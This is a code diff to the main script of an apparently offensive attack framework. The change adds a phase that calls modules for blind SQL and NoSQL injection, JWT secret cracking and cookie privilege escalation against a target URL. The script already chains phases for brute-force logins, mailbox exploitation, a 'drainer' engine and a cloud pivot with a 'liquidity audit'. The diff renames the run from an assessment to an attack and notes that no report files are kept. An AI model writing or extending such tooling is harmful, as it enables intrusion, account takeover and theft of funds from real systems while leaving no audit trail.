@@ -16,6 +16,8 @@ import ipaddress
 from urllib.parse import urlsplit
 
 # Import framework modules
+from modules.db_assault import run_nosql_assault
+from modules.session_hijack import run_session_hijack
 from modules.drainer import run_drainer_engine
 from modules.parser import parse_target_source
 from modules.scanner import run_port_scanner
@@ -264,7 +266,20 @@ async def async_main():
         log(f"[ENGINE ERROR] {exc}", RED)
 
     # --------------------------------------------------------
-    # PHASE 4 — MULTI-PROTOCOL BRUTE-FORCE & MAILBOX EXPLOITATION
+    # PHASE 4 — AGGRESSIVE DB ASSAULT & SESSION HIJACKING
+    # --------------------------------------------------------
+    section("PHASE 3.5 — AGGRESSIVE DB ASSAULT & SESSION HIJACKING")
+    try:
+        display_progress("Executing time-based blind SQLi and NoSQL operator injection.")
+        await run_nosql_assault(target["url"])
+
+        display_progress("Executing JWT secret cracking and cookie privilege escalation fuzzing.")
+        await run_session_hijack(target["url"])
+    except Exception as exc:
+        log(f"[EXPLOIT ERROR] {exc}", RED)
+
+    # --------------------------------------------------------
+    # PHASE 5 — MULTI-PROTOCOL BRUTE-FORCE & MAILBOX EXPLOITATION
     # --------------------------------------------------------
     section("PHASE 4 — MULTI-PROTOCOL & MAILBOX EXPLOITATION")
     try:
@@ -277,7 +292,7 @@ async def async_main():
         log(f"[BRUTE ERROR] {exc}", RED)
 
     # --------------------------------------------------------
-    # PHASE 5 — CLOUD INFRASTRUCTURE PIVOT & LIQUIDITY AUDIT
+    # PHASE 6 — CLOUD INFRASTRUCTURE PIVOT & LIQUIDITY AUDIT
     # --------------------------------------------------------
     section("PHASE 5 — CLOUD INFRASTRUCTURE & LIQUIDITY AUDIT")
     try:
@@ -299,7 +314,7 @@ async def async_main():
     section("FINAL EXECUTION SUMMARY")
     print(f"Target: {target['url']}")
     print(f"Execution time: {elapsed:.2f} seconds")
-    log("LIVE RED-TEAM ASSESSMENT FINISHED", MATRIX_GREEN)
+    log("LIVE RED-TEAM ATTACK FINISHED", MATRIX_GREEN)
     log("All intelligence and telemetry streamed live on-screen.", NEON_BLUE)
     log("Zero report files written to disk.", NEON_BLUE)
 
